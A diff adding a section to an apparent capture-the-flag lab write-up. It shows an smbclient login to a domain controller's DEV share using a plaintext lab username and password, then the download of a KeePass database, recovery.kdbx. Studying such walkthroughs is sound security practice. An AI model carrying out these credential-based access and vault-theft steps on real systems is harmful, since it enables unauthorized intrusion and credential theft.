@@ -167,3 +167,31 @@ SMB         10.129.232.75   445    DC               IPC$            READ        
 SMB         10.129.232.75   445    DC               NETLOGON        READ            Logon server share 
 SMB         10.129.232.75   445    DC               SYSVOL          READ            Logon server share
 ```
+
+Logging into the share, we find recovery.kdbx and download it to our local machine:
+
+#### Logging into DEV:
+
+```
+smbclient -U 'levi.james%KingofAkron2025!' \\\\10.129.232.75\\DEV
+```
+
+####  Listing share contents:
+
+```
+smb: \> ls
+  .                                  DR        0  Sun Mar 23 03:07:57 2025
+  ..                                  D        0  Sat Mar  8 11:52:57 2025
+  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 03:09:12 2025
+  Projects                            D        0  Sat Mar  8 11:53:36 2025
+  recovery.kdbx                       A     2677  Tue Mar 11 22:25:46 2025
+
+		5080575 blocks of size 4096. 1644940 blocks available
+```
+
+#### Downloading recovery.kdbx:
+
+```
+smb: \> get recovery.kdbx 
+getting file \recovery.kdbx of size 2677 as recovery.kdbx (9.1 KiloBytes/sec) (average 9.1 KiloBytes/sec)
+```
